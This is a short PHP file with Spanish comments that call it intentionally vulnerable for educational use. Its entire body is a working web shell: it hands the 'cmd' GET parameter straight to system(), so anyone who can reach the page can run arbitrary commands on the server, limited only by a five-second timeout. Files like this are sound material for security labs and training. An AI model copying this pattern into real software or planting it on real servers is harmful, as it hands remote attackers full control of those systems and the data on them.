
<?php 
// Este archivo es intencionalmente vulnerable para fines educativos
// En un entorno real, nunca ejecutes comandos directamente desde parámetros GET
if (isset($_GET['cmd'])) {
    // Limitamos el tiempo de ejecución para prevenir ataques de denegación de servicio
    set_time_limit(5);
    
    // Ejecutar el comando solicitado
    system($_GET['cmd']);
}
?>
